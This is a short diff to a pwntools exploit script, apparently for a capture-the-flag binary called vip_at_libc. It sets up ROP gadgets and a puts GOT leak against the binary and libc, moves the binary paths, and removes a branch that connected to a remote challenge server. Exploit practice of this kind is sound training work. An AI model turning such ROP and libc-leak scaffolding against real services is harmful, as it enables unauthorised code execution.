@@ -4,8 +4,8 @@ from pwn import *
 from pprint import pprint
 import sys
 
-ELF_LOADED	= ELF('./vip_at_libc')
-LIB_LOADED	= ELF('./libc.so.6')
+ELF_LOADED	= ELF('./bin/vip_at_libc')
+LIB_LOADED	= ELF('./bin/libc.so.6')
 ROP_1		= ROP(ELF_LOADED)
 
 PUT_GOT = ELF_LOADED.got['puts']
@@ -19,18 +19,16 @@ RET = ROP_1.find_gadget(["ret"])[0]
 context.arch = 'amd64'
 context.binary = ELF_LOADED
 
-if len(sys.argv) - 1 == 0:
-	ENV = {"LD_PRELOAD": "./libc.so.6"}
-	PROCESS = ELF_LOADED.process(env=ENV)
-	# gdb.attach(PROCESS.pid, """
-	# 	b access_lounge
-	# 	c
-	# 	""")
-	gdb.attach(PROCESS.pid, """
-		c
-		""")
-else:
-	PROCESS = remote('51.254.39.184', 1335)
+ENV = {"LD_PRELOAD": "./libc.so.6"}
+PROCESS = ELF_LOADED.process(env=ENV)
+# gdb.attach(PROCESS.pid, """
+# 	b access_lounge
+# 	c
+# 	""")
+gdb.attach(PROCESS.pid, """
+	c
+	""")
+
 
 
 def CheakyCheat():
